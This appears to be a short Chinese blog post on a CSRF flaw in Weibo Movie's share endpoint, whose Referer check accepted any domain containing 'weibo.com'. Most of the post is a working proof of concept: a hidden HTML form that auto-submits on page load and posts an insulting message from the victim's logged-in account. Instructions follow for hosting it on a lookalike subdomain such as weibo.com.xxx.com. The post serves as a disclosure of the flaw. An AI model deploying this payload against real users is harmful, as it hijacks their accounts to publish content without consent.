## CSRF漏洞之你点我链接就会发一条微博

注：非本人发现，看到微博上一位大大在玩。

防范CSRF漏洞有两种方式，一种是生成表单的时候插入Token，提交的时候后端验证Token是否合法，另外一种就是验证请求的`Referer`是否来自自己的域名。微博电影上的分享内容到微博的接口采用的后面的方式，在服务端验证。然而，验证好像写错了，正确的姿势应该是验证域名的后缀吧，但微博的后台开发验证是：只要域名里有`weibo.com`就认为是合法的请求。

### POC

* test.html

```html
<div style="display: none;">
  <form action="http://movie.weibo.com/movie/web/ajax_sendweibo" method="post" name="wtf" 
      enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="content" value="我是大傻逼"/>
    <input type="hidden" name="id" value="178924"/>
    <input type="hidden" name="star" value="5"/>
    <button type="submit"></button>
  </form>
</div>
<script>
window.onload = function() {document.wtf.submit();}
</script>
```

* 找个域名，设置一个子域，如：`weibo.com.xxx.com`

* 在已经登录了微博的浏览器里访问：http://weibo.com.xxx.com/test.html 。
* 也可以设置本地hosts，`127.0.0.1 weibo.com.xxx.com`，然后启动一个HTTP服务器，如：`python -m SimpleHTTPServer 80`
